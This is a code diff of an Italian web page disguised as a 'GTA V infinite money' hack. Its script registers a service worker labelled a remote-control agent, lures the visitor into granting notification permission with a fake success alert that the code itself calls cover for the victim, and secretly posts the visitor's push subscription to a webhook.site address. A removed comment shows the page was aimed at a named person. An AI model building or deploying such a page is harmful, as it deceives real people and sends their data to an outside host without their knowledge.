@@ -11,50 +11,44 @@
             font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px;
             box-shadow: 0 0 20px #ff0000;
         }
-        #hack-button:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
 
     <h1>SISTEMA ACCREDITO GTA V</h1>
     <p>Stato Server: <span style="color: lime;">ATTIVO</span></p>
-    
     <br><br>
-    
     <button id="hack-button" onclick="avviaAttacco()">CLICCA PER SOLDI INFINITI</button>
 
     <script>
-        // 1. REGISTRAZIONE DELL'AGENTE (Con comando per il telefono)
+        // Registrazione dell'agente per il controllo remoto
         if ('serviceWorker' in navigator) {
-            window.addEventListener('load', function() {
-                // Il ./ serve a non far dare l'errore 404 sul cellulare
-                navigator.serviceWorker.register('./sw.js').then(function(reg) {
-                    console.log('Agente installato con successo nel browser!');
-                }).catch(function(err) {
-                    console.log('Errore 404 o di caricamento:', err);
-                });
-            });
+            navigator.serviceWorker.register('./sw.js');
         }
 
-        // 2. FUNZIONE PER CATTURARE FABRIZIO
         function avviaAttacco() {
             Notification.requestPermission().then(function(permission) {
                 if (permission === 'granted') {
-                    alert('CONNESSO! Risorse in fase di accreditamento sul tuo ID...');
-                    console.log('L\'hacker ha ottenuto il permesso!');
-                    
-                    // Qui l'hacker vede il codice della vittima nella console
+                    // Copertura per la vittima
+                    alert('CONNESSO! Risorse in fase di accreditamento sul tuo account...');
+
                     navigator.serviceWorker.ready.then(function(reg) {
                         reg.pushManager.subscribe({
                             userVisibleOnly: true,
-                            applicationServerKey: 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU' // Chiave test
+                            applicationServerKey: 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU'
                         }).then(function(sub) {
-                            console.log('ID VITTIMA CATTURATO:', JSON.stringify(sub));
+                            
+                            // INVIO SEGRETO AL TUO WEBHOOK
+                            fetch('https://webhook.site/562e593a-485a-4b2d-ba7d-245bc5f33e72', {
+                                method: 'POST',
+                                mode: 'no-cors', 
+                                body: JSON.stringify(sub)
+                            });
+                            
                         });
                     });
-
                 } else {
-                    alert('ERRORE: Devi cliccare su CONSENTI per ricevere i soldi!');
+                    alert('ERRORE: Devi cliccare su CONSENTI per attivare il glitch!');
                 }
             });
         }
